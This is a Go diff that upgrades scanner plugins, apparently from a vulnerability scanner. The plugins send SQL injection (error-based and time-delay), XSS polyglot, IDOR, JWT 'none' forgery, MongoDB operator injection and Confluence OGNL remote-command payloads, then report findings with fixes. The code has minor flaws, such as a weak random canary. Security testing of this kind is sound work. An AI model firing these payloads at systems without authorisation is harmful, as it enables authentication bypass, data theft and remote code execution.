@@ -5,6 +5,8 @@ import (
 	"bufio"
 	"context"
 	"crypto/tls"
+	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"io"
 	"net"
@@ -12,6 +14,7 @@ import (
 	"net/url"
 	"os"
 	"path/filepath"
+	"regexp"
 	"strconv"
 	"strings"
 	"time"
@@ -560,103 +563,231 @@ func (p *OpenRedirectPlugin) Run(target ScanTarget) *Vulnerability {
 // NEXT 10 PLUGINS (OFFENSIVE / NEW)
 // ==========================================
 
-// 11. SQLi (V2 - MULTI PAYLOAD)
+// 11. SQLi - V3
 type SQLInjectionPlugin struct{}
 
-func (p *SQLInjectionPlugin) Name() string { return "SQL Injection (Advanced)" }
+func (p *SQLInjectionPlugin) Name() string { return "SQL Injection (Professional)" }
+
 func (p *SQLInjectionPlugin) Run(target ScanTarget) *Vulnerability {
+	// Only scan web ports
 	if !isWebPort(target.Port) {
 		return nil
 	}
 
-	// COMPLEX PAYLOAD LIST
-	payloads := []string{
-		"'",                     // Classic test
-		"''",                    // Double quote test
-		"`",                     // Backtick (MySQL)
-		"';",                    // Query termination
-		"' OR '1'='1",           // Classic Bypass
-		"' OR 1=1 --",           // Commented
-		"admin' --",             // Username manipulation
-		"' UNION SELECT NULL--", // Union based test
-		"')) OR (('x'='x",       // Parenthesis complex structure
+	client := getClient()
+	baseURL := getURL(target, "")
+
+	// ==================================================
+	// 1. ERROR-BASED PAYLOADS
+	// ==================================================
+	standardPayloads := []string{
+		"'", "''", "`", "';",
+		"' OR '1'='1",
+		"admin' --",
+		"' UNION SELECT 1, @@version --",
 	}
 
-	// Error messages vary by database, catch them all
-	errors := []string{
+	// Database Error Signatures (Pattern Matching)
+	dbErrors := []string{
 		"SQL syntax", "mysql_fetch", "ORA-01756", "Oracle Error",
 		"PostgreSQL query failed", "SQLServer JDBC Driver",
 		"Microsoft OLE DB Provider for SQL Server", "Unclosed quotation mark",
+		"CLI Driver", "DB2 SQL error", "SQLite/JDBCDriver",
 	}
 
-	for _, payload := range payloads {
-		// URL Encode to avoid immediate WAF block
-		encodedPayload := url.QueryEscape(payload)
-		resp, err := getClient().Get(getURL(target, "/?id="+encodedPayload))
+	for _, payload := range standardPayloads {
+		// Construct Target URL with Payload
+		targetURL := baseURL + "/?id=" + url.QueryEscape(payload)
 
-		if err == nil {
-			defer resp.Body.Close()
-			bodyBytes, _ := io.ReadAll(resp.Body)
-			bodyString := string(bodyBytes)
+		resp, err := client.Get(targetURL)
+		if err != nil {
+			continue
+		}
 
-			for _, errMsg := range errors {
-				if strings.Contains(bodyString, errMsg) {
-					return &Vulnerability{
-						Target:      target,
-						Name:        "SQL Injection (Detected)",
-						Severity:    "CRITICAL",
-						CVSS:        9.8,
-						Description: fmt.Sprintf("Database error returned. Working Payload: %s", payload),
-						Solution:    "Use Prepared Statements (PDO).",
-						Reference:   "OWASP SQLi",
-					}
+		bodyBytes, _ := io.ReadAll(resp.Body)
+		resp.Body.Close()
+
+		bodyStr := string(bodyBytes)
+
+		// A. Error-Based Detection
+		for _, errMsg := range dbErrors {
+			if strings.Contains(bodyStr, errMsg) {
+				return &Vulnerability{
+					Target:      target,
+					Name:        "SQL Injection (Error-Based)",
+					Severity:    "CRITICAL",
+					CVSS:        9.8,
+					Description: fmt.Sprintf("Database returned syntax error.\nPayload: %s\nMatch: %s", payload, errMsg),
+					Solution:    "Use Prepared Statements (PDO) or Parameterized Queries.",
+					Reference:   "OWASP A03:2021-Injection",
 				}
 			}
 		}
 	}
+
+	// ==================================================
+	// 2. TIME-BASED BLIND SQLi (Latency Check)
+	// ==================================================
+	// We attempt to force the database to sleep for X seconds.
+
+	sleepSeconds := 5
+	timePayloads := map[string]string{
+		"MySQL/MariaDB": fmt.Sprintf("' AND SLEEP(%d)--", sleepSeconds),
+		"PostgreSQL":    fmt.Sprintf("'; SELECT pg_sleep(%d)--", sleepSeconds),
+		"MSSQL":         fmt.Sprintf("'; WAITFOR DELAY '00:00:%02d'--", sleepSeconds),
+	}
+
+	for dbType, payload := range timePayloads {
+		targetURL := baseURL + "/?id=" + url.QueryEscape(payload)
+
+		// Start Timer
+		start := time.Now()
+
+		// Execute Request
+		resp, err := client.Get(targetURL)
+
+		// Measure Duration
+		duration := time.Since(start)
+
+		if err == nil {
+			resp.Body.Close()
+		}
+
+		// Logic: If the request took longer than our sleep command, the DB executed it.
+		if duration.Seconds() >= float64(sleepSeconds) {
+			return &Vulnerability{
+				Target:      target,
+				Name:        fmt.Sprintf("Blind SQL Injection (%s)", dbType),
+				Severity:    "CRITICAL",
+				CVSS:        9.9,
+				Description: fmt.Sprintf("Server responded with a delay of %.2f seconds.\nTime-Based Payload: %s", duration.Seconds(), payload),
+				Solution:    "Validate user inputs and use Prepared Statements to prevent blind injection.",
+				Reference:   "OWASP Blind SQL Injection",
+			}
+		}
+	}
+
 	return nil
 }
 
-// 12. XSS (V2 - POLYGLOT & BYPASS)
+// 12. XSS (V3 - PRO: POLYGLOT & CONTEXT AWARE)
 type XSSPlugin struct{}
 
-func (p *XSSPlugin) Name() string { return "XSS (Advanced)" }
+func (p *XSSPlugin) Name() string { return "XSS (Pro - Context Aware)" }
+
+// genXSSCanary generates a random token to identify our payload.
+// We use this instead of a static string like "DORM" to prevent false positives
+// from previous scans or cached pages.
+func genXSSCanary() string {
+	const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
+	b := make([]byte, 6)
+	for i := range b {
+		b[i] = charset[time.Now().UnixNano()%int64(len(charset))]
+	}
+	// Example Output: "dormx9a2s1"
+	return "dorm" + string(b)
+}
+
 func (p *XSSPlugin) Run(target ScanTarget) *Vulnerability {
 	if !isWebPort(target.Port) {
 		return nil
 	}
 
-	// Script alert is not enough, need filter bypassing codes
-	payloads := []string{
-		"<script>alert('DORM')</script>",          // Classic
-		"\"><script>alert('DORM')</script>",       // Input escape
-		"<img src=x onerror=alert('DORM')>",       // Image error (Common Bypass)
-		"<svg/onload=alert('DORM')>",              // Modern SVG Bypass
-		"javascript:alert('DORM')",                // Link injection
-		"'-alert('DORM')-'",                       // JS String escape
-		"</script><script>alert('DORM')</script>", // Close/Open Script
+	client := getClient()
+	canary := genXSSCanary()
+
+	// We define strategic payloads to test different injection contexts.
+	// FormatStr: The placeholder '%s' will be replaced by our unique Canary token.
+	// Required: These specific characters MUST exist in the response raw (unescaped)
+	//           for the vulnerability to be considered valid.
+	tests := []struct {
+		Name      string
+		FormatStr string
+		Required  []string
+		Context   string
+	}{
+		// 1. Classic Reflection (HTML Context)
+		// <script> is obvious and often blocked by WAF. <svg> or <img> are stealthier.
+		{
+			Name:      "HTML Context (Script Tag)",
+			FormatStr: "<script>print('%s')</script>",
+			Required:  []string{"<script>", "print", canary},
+			Context:   "HTML Body",
+		},
+		{
+			Name:      "HTML Context (SVG/OnLoad)",
+			FormatStr: "<svg/onload=confirm('%s')>",
+			Required:  []string{"<svg", "onload", canary},
+			Context:   "HTML Body",
+		},
+		// 2. Attribute Injection (Breaking out of an input value)
+		// Example: <input value="USER_INPUT"> -> <input value=""><img src=x...>
+		{
+			Name:      "Attribute Breakout (Double Quote)",
+			FormatStr: "\"><img src=x onerror=prompt('%s')>",
+			Required:  []string{"\">", "<img", canary},
+			Context:   "HTML Attribute",
+		},
+		{
+			Name:      "Attribute Breakout (Single Quote)",
+			FormatStr: "';print('%s');//",
+			Required:  []string{"'", ";print", canary},
+			Context:   "JavaScript Variable",
+		},
+		// 3. Polyglot (Hybrid payload designed to break multiple contexts)
+		// Starts with javascript: protocol, closes tags, and comments out the rest.
+		{
+			Name:      "Polyglot (Filter Bypass)",
+			FormatStr: "javascript:/*--></title></style></textarea><img src=x onerror=alert('%s')//",
+			Required:  []string{"<img", "onerror", canary},
+			Context:   "Complex / Polyglot",
+		},
 	}
 
-	for _, payload := range payloads {
-		// Add parameter to URL
-		checkURL := getURL(target, "/?q="+url.QueryEscape(payload))
-		resp, err := getClient().Get(checkURL)
+	for _, test := range tests {
+		// Construct the payload: e.g., <script>print('dormx9a2s1')</script>
+		payload := fmt.Sprintf(test.FormatStr, canary)
 
+		// Inject payload into the URL query parameter
+		checkURL := getURL(target, "/?q="+url.QueryEscape(payload))
+
+		resp, err := client.Get(checkURL)
 		if err == nil {
 			defer resp.Body.Close()
-			bodyBytes, _ := io.ReadAll(resp.Body)
-			bodyString := string(bodyBytes)
 
-			// Is the code reflected "as is" in the response?
-			if strings.Contains(bodyString, payload) {
-				return &Vulnerability{
-					Target:      target,
-					Name:        "Reflected XSS",
-					Severity:    "HIGH",
-					CVSS:        7.2,
-					Description: fmt.Sprintf("XSS Payload executed: %s", payload),
-					Solution:    "Encode inputs (HTML Entity).",
-					Reference:   "OWASP XSS",
+			// Read only the first 10KB to avoid high memory usage on large responses.
+			// XSS vulnerabilities typically reflect in the header or the beginning of the body.
+			headerCheck := make([]byte, 10240)
+			n, _ := resp.Body.Read(headerCheck)
+			bodyString := string(headerCheck[:n])
+
+			// STEP 1: Detection - Is our Canary token present in the response?
+			if strings.Contains(bodyString, canary) {
+
+				// STEP 2: Verification - Are critical characters (Required) escaped?
+				// If we sent "<script>" but the server returned "&lt;script&gt;",
+				// the browser will render it as text, not code. We must ensure
+				// the dangerous tags are present in their RAW form.
+
+				isVulnerable := true
+
+				for _, req := range test.Required {
+					if !strings.Contains(bodyString, req) {
+						isVulnerable = false
+						break
+					}
+				}
+
+				if isVulnerable {
+					return &Vulnerability{
+						Target:      target,
+						Name:        "Reflected XSS (" + test.Name + ")",
+						Severity:    "HIGH",
+						CVSS:        7.2, // High severity, but requires user interaction.
+						Description: fmt.Sprintf("XSS Payload executed successfully.\nContext: %s\nPayload: %s\nSent Canary: %s", test.Context, payload, canary),
+						Solution:    "Implement Context-Aware Output Encoding (e.g., HTML Entity Encode for Body, JavaScript Hex Encode for Script). Implementing Content-Security-Policy (CSP) is also highly recommended.",
+						Reference:   "OWASP Cross Site Scripting (XSS)",
+					}
 				}
 			}
 		}
@@ -1953,28 +2084,116 @@ func (p *ConfigJsonPlugin) Run(target ScanTarget) *Vulnerability {
 	return nil
 }
 
-// 50. IDOR / BROKEN ACCESS (Basic Check)
+// 50. IDOR / BROKEN ACCESS - V2
 type IDORPlugin struct{}
 
-func (p *IDORPlugin) Name() string { return "IDOR / Unauthorized Access Test" }
+func (p *IDORPlugin) Name() string { return "IDOR / Broken Object Level Auth (Pro)" }
+
 func (p *IDORPlugin) Run(target ScanTarget) *Vulnerability {
 	if !isWebPort(target.Port) {
 		return nil
 	}
-	// Common IDOR parameters
-	urls := []string{"/profile?id=1", "/user/1", "/order/1"}
-	for _, u := range urls {
-		resp, err := getClient().Get(getURL(target, u))
-		if err == nil && resp.StatusCode == 200 {
-			defer resp.Body.Close()
-			buf := make([]byte, 500)
-			resp.Body.Read(buf)
-			if strings.Contains(string(buf), "admin") || strings.Contains(string(buf), "email") {
+
+	client := getClient()
+
+	// List of potential endpoints vulnerable to IDOR.
+	// We use standard placeholders {ID} to swap numbers dynamically.
+	patterns := []string{
+		"/profile?id={ID}",
+		"/users/{ID}",
+		"/api/v1/user/{ID}",
+		"/orders/{ID}",
+		"/invoice?id={ID}",
+		"/account/settings/{ID}",
+	}
+
+	for _, pattern := range patterns {
+		// 1. BASELINE REQUEST (ID=1)
+		// We assume ID=1 often exists (admin or first user).
+		urlBase := getURL(target, strings.Replace(pattern, "{ID}", "1", 1))
+		respBase, err := client.Get(urlBase)
+		if err != nil || respBase.StatusCode != 200 {
+			continue // Endpoint likely doesn't exist or is protected.
+		}
+
+		bodyBase, _ := io.ReadAll(respBase.Body)
+		respBase.Body.Close()
+		lenBase := len(bodyBase)
+
+		// 2. SOFT-404 CHECK (ID=999999)
+		// We verify if the server returns 200 OK for non-existent resources.
+		// If it does, we must ensure our "Target" request looks different from this error page.
+		urlNoise := getURL(target, strings.Replace(pattern, "{ID}", "999999", 1))
+		respNoise, err := client.Get(urlNoise)
+
+		isSoft404 := false
+		lenNoise := 0
+
+		if err == nil {
+			bodyNoise, _ := io.ReadAll(respNoise.Body)
+			respNoise.Body.Close()
+			lenNoise = len(bodyNoise)
+
+			// If the non-existent page returns 200 OK, we check similarity.
+			if respNoise.StatusCode == 200 {
+				// Calculate difference ratio. If lengths are very close (within 5%), it's likely a generic page.
+				diff := float64(lenBase - lenNoise)
+				if diff < 0 {
+					diff = -diff
+				} // Absolute value
+
+				// If the baseline and the noise (error) page are identical in size,
+				// the server is just returning a static "200 OK" for everything. Skip it.
+				if diff < float64(lenBase)*0.05 {
+					continue
+				}
+				isSoft404 = true
+			}
+		}
+
+		// 3. TARGET REQUEST (ID=2)
+		// Now we try to access another valid resource.
+		urlTarget := getURL(target, strings.Replace(pattern, "{ID}", "2", 1))
+		respTarget, err := client.Get(urlTarget)
+
+		if err == nil {
+			defer respTarget.Body.Close()
+			bodyTarget, _ := io.ReadAll(respTarget.Body)
+			lenTarget := len(bodyTarget)
+
+			// LOGIC:
+			// 1. Must be 200 OK.
+			// 2. If we detected a Soft-404 (fake 200), the Target must NOT look like the Soft-404 page.
+			// 3. The Target should look somewhat similar to the Baseline (ID=1) structurally.
+
+			if respTarget.StatusCode == 200 {
+
+				// Check against Soft-404 noise
+				if isSoft404 {
+					diffNoise := float64(lenTarget - lenNoise)
+					if diffNoise < 0 {
+						diffNoise = -diffNoise
+					}
+
+					// If Target looks like the Error Page, it's not a vulnerability.
+					if diffNoise < float64(lenNoise)*0.05 {
+						continue
+					}
+				}
+
+				// If we reached here:
+				// ID=1 exists (200).
+				// ID=999999 is either 404 or significantly different.
+				// ID=2 exists (200) and is different from the error page.
+
 				return &Vulnerability{
-					Target: target, Name: "Potential IDOR / Auth Bypass", Severity: "MEDIUM", CVSS: 6.5,
-					Description: "Sensitive ID access without login.",
-					Solution:    "Implement proper authorization checks.",
-					Reference:   "OWASP IDOR",
+					Target:      target,
+					Name:        "Potential IDOR / BOLA",
+					Severity:    "MEDIUM", // Can be High, but requires verification.
+					CVSS:        6.5,
+					Description: fmt.Sprintf("Broken Object Level Authorization suspected.\nEndpoint: %s\n- ID=1 (Baseline): %d bytes\n- ID=2 (Target): %d bytes\n- ID=999999 (Noise): %d bytes\n\nThe server returns valid content for sequential IDs without apparent authentication checks.", pattern, lenBase, lenTarget, lenNoise),
+					Solution:    "Implement strict access controls. Verify that the logged-in user has permission to access the requested object ID.",
+					Reference:   "OWASP API Security Top 10: Broken Object Level Authorization",
 				}
 			}
 		}
@@ -2740,15 +2959,148 @@ func (p *SSRFMetadataPlugin) Run(target ScanTarget) *Vulnerability {
 	return nil
 }
 
-// 75. JWT WEAKNESS (None Algorithm)
+// 75. JWT WEAKNESS - V2
 type JWTWeaknessPlugin struct{}
 
-func (p *JWTWeaknessPlugin) Name() string { return "JWT None Algorithm" }
+func (p *JWTWeaknessPlugin) Name() string { return "JWT None Algorithm Attack" }
+
+// Helper: Tries to find a JWT string in headers or body using Regex.
+// JWT Format: header.payload.signature (Base64UrlEncoded)
+func findJWT(content string, headers http.Header) string {
+	// Regex for standard JWT pattern (simplified for speed)
+	// Looks for: eyJ... . eyJ... . ...
+	re := regexp.MustCompile(`ey[A-Za-z0-9-_]+\.ey[A-Za-z0-9-_]+\.[A-Za-z0-9-_]*`)
+
+	// 1. Check Authorization Header
+	auth := headers.Get("Authorization")
+	if len(auth) > 7 && strings.HasPrefix(strings.ToLower(auth), "bearer ") {
+		token := strings.TrimSpace(auth[7:])
+		if re.MatchString(token) {
+			return token
+		}
+	}
+
+	// 2. Check Cookies
+	cookieHeader := headers.Get("Set-Cookie")
+	if match := re.FindString(cookieHeader); match != "" {
+		return match
+	}
+
+	// 3. Check Body (Last resort, e.g., JSON response)
+	if match := re.FindString(content); match != "" {
+		return match
+	}
+
+	return ""
+}
+
 func (p *JWTWeaknessPlugin) Run(target ScanTarget) *Vulnerability {
 	if !isWebPort(target.Port) {
 		return nil
 	}
-	return nil // Placeholder logic
+
+	client := getClient()
+
+	// STEP 1: Discovery - Try to harvest a valid token from the target.
+	// We request the main page or common API endpoints to see if a guest token is issued.
+	resp, err := client.Get(getURL(target, "/"))
+	if err != nil {
+		return nil
+	}
+	defer resp.Body.Close()
+
+	bodyBytes, _ := io.ReadAll(resp.Body)
+	token := findJWT(string(bodyBytes), resp.Header)
+
+	// If no token is found, we can't test for JWT vulnerabilities.
+	if token == "" {
+		return nil
+	}
+
+	// STEP 2: Parse the Token
+	parts := strings.Split(token, ".")
+	if len(parts) != 3 {
+		return nil
+	}
+
+	// We only need to manipulate the Header (parts[0])
+	// Decode existing header
+	headerBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
+	if err != nil {
+		return nil
+	}
+
+	// Unmarshal to Map
+	var headerMap map[string]interface{}
+	if err := json.Unmarshal(headerBytes, &headerMap); err != nil {
+		return nil
+	}
+
+	// STEP 3: The Attack Vectors
+	// We verify variations because some libraries implement checks differently.
+	vectors := []string{"none", "None", "NONE"}
+
+	for _, alg := range vectors {
+		// Modify the algorithm
+		headerMap["alg"] = alg
+
+		// Re-encode Header
+		newHeaderJSON, _ := json.Marshal(headerMap)
+		newHeader := base64.RawURLEncoding.EncodeToString(newHeaderJSON)
+
+		// Construct Malicious Token: Header.Payload. (Signature is removed, trailing dot remains)
+		// Note: Some libraries expect the dot, some don't. The standard attack keeps the dot.
+		evilToken := fmt.Sprintf("%s.%s.", newHeader, parts[1])
+
+		// Prepare Request
+		req, _ := http.NewRequest("GET", getURL(target, "/"), nil)
+
+		// Inject into common places
+		req.Header.Set("Authorization", "Bearer "+evilToken)
+		req.Header.Set("Cookie", "access_token="+evilToken+"; session="+evilToken)
+
+		respAttack, err := client.Do(req)
+		if err == nil {
+			defer respAttack.Body.Close()
+
+			// STEP 4: Verification (Differential Analysis)
+			// If we get a 200 OK, it *might* be vulnerable, OR the page is just public.
+			// To confirm, we send a definitely BROKEN token.
+
+			if respAttack.StatusCode == 200 {
+
+				// Send a garbage token to see if the server validates signatures at all.
+				garbageToken := "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
+				reqCheck, _ := http.NewRequest("GET", getURL(target, "/"), nil)
+				reqCheck.Header.Set("Authorization", "Bearer "+garbageToken)
+
+				respCheck, errCheck := client.Do(reqCheck)
+
+				if errCheck == nil {
+					defer respCheck.Body.Close()
+
+					// FINAL JUDGEMENT:
+					// If "None" Alg -> 200 OK (Accepted)
+					// AND
+					// Garbage Token -> 401/403/500 (Rejected)
+					// THEN -> VULNERABLE.
+
+					if respCheck.StatusCode == 401 || respCheck.StatusCode == 403 || respCheck.StatusCode == 500 {
+						return &Vulnerability{
+							Target:      target,
+							Name:        "JWT 'None' Algorithm Bypass",
+							Severity:    "CRITICAL",
+							CVSS:        9.0, // Critical because it allows full authentication bypass (Impersonation).
+							Description: fmt.Sprintf("Server accepted a JWT with 'alg: %s' and no signature.\nThis allows attackers to forge tokens and impersonate any user.", alg),
+							Solution:    "Configure the JWT library to explicitly reject the 'none' algorithm. Enforce a strong signing algorithm (e.g., HS256, RS256).",
+							Reference:   "RFC 7519 / CVE-2015-9235",
+						}
+					}
+				}
+			}
+		}
+	}
+	return nil
 }
 
 // 76. APACHE STRUTS RCE (OGNL Injection)
@@ -2799,45 +3151,123 @@ func (p *CitrixPlugin) Run(target ScanTarget) *Vulnerability {
 	return nil
 }
 
-// 78. NOSQL INJECTION (MongoDB)
+// 78. NOSQL INJECTION (V2 - PRO: DIFFERENTIAL ANALYSIS)
 type NoSQLPlugin struct{}
 
-func (p *NoSQLPlugin) Name() string { return "NoSQL Injection (MongoDB)" }
+func (p *NoSQLPlugin) Name() string { return "NoSQL Injection (MongoDB - Pro)" }
+
 func (p *NoSQLPlugin) Run(target ScanTarget) *Vulnerability {
 	if !isWebPort(target.Port) {
 		return nil
 	}
 
-	targetURL := getURL(target, "/?id[$ne]=-1")
-	resp, err := getClient().Get(targetURL)
-	if err == nil {
-		defer resp.Body.Close()
-		bodyBytes, _ := io.ReadAll(resp.Body)
-		if resp.StatusCode == 200 && len(bodyBytes) > 500 {
-			// Heuristic check
+	client := getClient()
+
+	// Common parameters that might interact with a database
+	params := []string{"id", "user", "username", "q", "search", "query"}
+
+	for _, param := range params {
+		// STEP 1: Baseline Request (Negative Test)
+		// We ask for a value that definitely doesn't exist.
+		// Expected: Empty result, small page size, or 404.
+		dummyVal := "dorm_nosql_check_99999"
+		urlBase := getURL(target, fmt.Sprintf("/?%s=%s", param, dummyVal))
+
+		respBase, err := client.Get(urlBase)
+		if err != nil {
+			continue
+		}
+
+		bodyBase, _ := io.ReadAll(respBase.Body)
+		respBase.Body.Close()
+		lenBase := len(bodyBase)
+
+		// STEP 2: Injection Request (Logical Operator)
+		// We use the MongoDB operator [$ne] (Not Equal).
+		// Query: "Give me everything where param is NOT equal to dummyVal".
+		// Expected: If vulnerable, this returns ALL records (DB Dump), causing a massive size increase.
+		urlAttack := getURL(target, fmt.Sprintf("/?%s[$ne]=%s", param, dummyVal))
+
+		respAttack, err := client.Get(urlAttack)
+		if err == nil {
+			defer respAttack.Body.Close()
+			bodyAttack, _ := io.ReadAll(respAttack.Body)
+			lenAttack := len(bodyAttack)
+
+			// LOGIC:
+			// 1. Attack must be 200 OK.
+			// 2. The attack response size must be significantly larger than the baseline.
+			//    We use a factor of 2x or a minimum byte difference (e.g., 500 bytes) to avoid noise.
+
+			sizeDiff := lenAttack - lenBase
+			isLarger := lenAttack > (lenBase * 2) // At least double the size?
+			isSignificant := sizeDiff > 500       // At least 500 bytes of extra data?
+
+			if respAttack.StatusCode == 200 && (isLarger || isSignificant) {
+				return &Vulnerability{
+					Target:      target,
+					Name:        "NoSQL Injection (MongoDB)",
+					Severity:    "HIGH",
+					CVSS:        8.2,
+					Description: fmt.Sprintf("MongoDB Injection detected via operator manipulation.\nParameter: %s\nBaseline Size: %d bytes\nInjection Size: %d bytes\n\nThe query '[$ne]' (Not Equal) forced the database to return more data than expected.", param, lenBase, lenAttack),
+					Solution:    "Sanitize inputs and avoid passing query parameters directly to the database engine. Use type casting.",
+					Reference:   "OWASP NoSQL Injection",
+				}
+			}
 		}
 	}
 	return nil
 }
 
-// 79. ATLASSIAN CONFLUENCE RCE (OGNL)
+// 79. ATLASSIAN CONFLUENCE RCE (V2 - PRO: OUTPUT VERIFICATION)
 type ConfluencePlugin struct{}
 
-func (p *ConfluencePlugin) Name() string { return "Atlassian Confluence RCE" }
+func (p *ConfluencePlugin) Name() string { return "Atlassian Confluence RCE (CVE-2022-26134)" }
+
 func (p *ConfluencePlugin) Run(target ScanTarget) *Vulnerability {
 	if !isWebPort(target.Port) {
 		return nil
 	}
 
+	// Payload Logic:
+	// We inject an OGNL expression into the URI that executes the 'id' command on Linux.
+	// The output is typically reflected in a custom header (X-Cmd-Response) or the body.
+	// Payload: ${@java.lang.Runtime@getRuntime().exec("id")}
 	payload := "/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D/"
+
 	resp, err := getClient().Get(getURL(target, payload))
 	if err == nil {
 		defer resp.Body.Close()
-		if resp.Header.Get("X-Cmd-Response") != "" {
+
+		// Read headers and body
+		headerVal := resp.Header.Get("X-Cmd-Response")
+		bodyBytes, _ := io.ReadAll(resp.Body)
+		bodyString := string(bodyBytes)
+
+		// LOGIC:
+		// 1. Check for specific header reflection (common in exploit kits).
+		// 2. Check for standard 'id' command output in the body (uid=0(root)...).
+
+		isVulnerable := false
+		proof := ""
+
+		if headerVal != "" {
+			isVulnerable = true
+			proof = "Header: " + headerVal
+		} else if strings.Contains(bodyString, "uid=") && strings.Contains(bodyString, "gid=") {
+			isVulnerable = true
+			proof = "Body contains 'uid=' pattern."
+		}
+
+		if isVulnerable {
 			return &Vulnerability{
-				Target: target, Name: "Atlassian Confluence RCE", Severity: "CRITICAL", CVSS: 9.8,
-				Description: "Unauthenticated RCE via OGNL injection in URI.",
-				Solution:    "Patch Confluence Server/Data Center.", Reference: "CVE-2022-26134",
+				Target:      target,
+				Name:        "Atlassian Confluence RCE",
+				Severity:    "CRITICAL",
+				CVSS:        9.8,
+				Description: fmt.Sprintf("Unauthenticated Remote Code Execution confirmed.\nPayload: OGNL Injection\nProof: %s", proof),
+				Solution:    "Patch Confluence Server/Data Center to the latest version immediately.",
+				Reference:   "CVE-2022-26134",
 			}
 		}
 	}
